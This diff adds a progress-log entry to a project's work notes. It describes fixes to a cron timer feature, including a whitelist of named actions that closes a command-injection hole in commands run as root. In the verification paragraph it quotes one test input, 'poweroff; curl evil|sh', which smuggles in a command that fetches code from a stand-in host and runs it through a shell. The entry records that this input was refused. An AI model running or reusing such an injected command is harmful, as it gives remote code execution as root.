@@ -1,4 +1,61 @@
 === CURRENT WORK ===
+(2026-08-08) Screen control (SCREEN-CONTROL-PLAN.md): step 2 of 7 DONE.
+
+Timers. Both bugs the plan identified are fixed, and the command a cron job
+runs is now a looked-up named action rather than anything a request can shape.
+
+  - UniCron.serialize() did int(str(job.minute)) on all five fields, which
+    raises ValueError on any slice that is not a plain number. '*' is the
+    default the web UI offers for every field, so the first realistic timer
+    anyone creates - "every day at 22:00", whose last three fields are all
+    '*' - blew up getJobs for the WHOLE list and made every timer on the node
+    invisible. All five fields are now the raw slice string, which also means
+    '*/15', '1-5' and '0,30' survive a round trip for the first time.
+  - timers.vue deleteItem() only spliced the local array and never sent
+    Settings/Cron/deleteJob, so a deletion looked like it worked until the
+    next refresh brought the timer back. It sends the command now and lets
+    the backend's reply rewrite the list.
+  - utils/system/crontab.py grew an ACTIONS registry ('pwr', 'reb' -> absolute
+    paths). new() and editJob() look the command up and refuse anything else;
+    the duplicated '/usr/sbin/' + ('poweroff' if ... else 'reboot') in both
+    crontab.py and api/system/cron.py is gone. These lines run as root and cron
+    hands them to /bin/sh, so this is the difference between a whitelist and a
+    command-injection hole.
+  - serialize() also maps the command BACK to its action key and adds 'known'.
+    It used to send the full path while the UI matched against 'pwr'/'reb', so
+    the Action column had always rendered a bare '/usr/sbin/poweroff'. A job we
+    did not write is now reported as-is, flagged not-known, and its schedule
+    stays editable while its command is left alone.
+  - The five schedule fields are comboboxes now, not selects: any cron slice is
+    legal and a select would silently blank a job using one. They are validated
+    with CronSlices.is_valid BEFORE the crontab is opened, because
+    CronTab.__exit__ calls write() unconditionally - exception or not - so a
+    slice rejected halfway through setall() would have been written back
+    half-applied.
+  - Removed the fake seeded "reboot at 00:00" row that looked like a real
+    timer until the first backend reply, and wired the unused setJobEnabled to
+    a per-row switch.
+  - Option values in timers.vue are all strings now. They were numbers while
+    '*' was a string, and getMonthTitle/getDayOfWeekTitle match with ===, so
+    the moment the backend started sending raw slices a '1' would no longer
+    have matched a 1 and the table would have shown bare numbers instead of
+    month and day names.
+
+Verified against the real root crontab on unitotem-test, end to end over the
+WebSocket API: "every day at 22:00" is created and listed (the case that used
+to break the list); '*/15' with '1-5' round-trips; setJobEnabled comments and
+uncomments the line; deleteJob removes the right job and leaves the other; an
+invalid slice and a command of "poweroff; curl evil|sh" are both refused with
+the crontab left untouched. Plus 17 in-memory checks on serialize()/new().
+
+NEXT: step 3 (manager/tests/ + pytest infrastructure).
+
+DEFERRED from step 2, deliberately: screenctl.py and the screen power/off
+actions in the registry. Their entire body is a call into utils/system/screens,
+which step 4 creates - shipping them now would mean offering a timer action
+that does nothing. They land with the hardware layer instead. The registry is
+already the extension point.
+
 (2026-08-07) Screen control (SCREEN-CONTROL-PLAN.md): step 1 of 7 DONE.
 
 Assignments are now keyed on (viewer, RandR output name) instead of
